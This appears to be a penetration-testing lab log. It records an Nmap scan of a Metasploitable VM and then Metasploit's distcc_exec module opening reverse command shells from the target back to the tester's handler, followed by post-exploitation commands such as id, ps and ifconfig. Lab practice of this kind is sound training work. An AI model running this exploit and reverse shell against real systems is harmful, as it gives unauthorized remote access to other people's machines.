1. Run NMAP Scan against Metasploitable VM
==========================================
root@alice:~# nmap -sT -T4 -A 192.168.209.151 2>&1 | tee distCCD_scan.txt
Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-05 20:45 EDT
Nmap scan report for 192.168.209.151
Host is up (0.0081s latency).
Not shown: 977 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)


2. DISTCCD port open on victim
===============================================
root@alice:~# grep 3632 distCCD_scan.txt
3632/tcp  open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))


3. MSFCONSOLE
==============
msf exploit(unix/misc/distcc_exec) > set ExitOnSession false
ExitOnSession => false
msf exploit(unix/misc/distcc_exec) > set PrependMigrate true
PrependMigrate => true
msf exploit(unix/misc/distcc_exec) > run

[*] Started reverse TCP double handler on 192.168.209.179:4444 
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo zW04CUDb9G1Z47Z3;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "zW04CUDb9G1Z47Z3\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (192.168.209.179:4444 -> 192.168.209.151:41101) at 2018-05-05 21:27:37 -0400


id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
exit
^C
Abort session 1? [y/N]  yes

[*] 192.168.209.151 - Command shell session 1 closed.  Reason: User exit
msf exploit(unix/misc/distcc_exec) > s
[-] Unknown command: s.
msf exploit(unix/misc/distcc_exec) > set payload 
payload => cmd/unix/reverse
msf exploit(unix/misc/distcc_exec) > show payloads 

msf exploit(unix/misc/distcc_exec) > run

[*] Started reverse TCP double handler on 192.168.209.179:4444 
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo KSjPBQ4rYbfrG2uE;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "KSjPBQ4rYbfrG2uE\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 2 opened (192.168.209.179:4444 -> 192.168.209.151:41900) at 2018-05-05 21:52:16 -0400
[*] Accepted the first client connection...

id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
whoami
daemon
ps
  PID TTY          TIME CMD
 4414 ?        00:00:00 portmap
 5036 ?        00:00:00 distccd
 5037 ?        00:00:00 distccd
 5174 ?        00:00:00 distccd
 5244 ?        00:00:00 atd
 5267 ?        00:00:00 distccd
17075 ?        00:00:00 sleep
17156 ?        00:00:00 sleep
17157 ?        00:00:00 telnet
17158 ?        00:00:00 sh
17159 ?        00:00:00 sh
17161 ?        00:00:00 telnet
17166 ?        00:00:00 ps
ifconfig
eth0      Link encap:Ethernet  HWaddr 00:0c:29:da:d0:d3  
          inet addr:192.168.209.151  Bcast:192.168.209.255  Mask:255.255.255.0
          inet6 addr: fe80::20c:29ff:feda:d0d3/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:181506 errors:8 dropped:93 overruns:0 frame:0
          TX packets:147154 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:20761982 (19.8 MB)  TX bytes:27812683 (26.5 MB)
          Interrupt:17 Base address:0x2000 

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:18958 errors:0 dropped:0 overruns:0 frame:0
          TX packets:18958 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:9396977 (8.9 MB)  TX bytes:9396977 (8.9 MB)

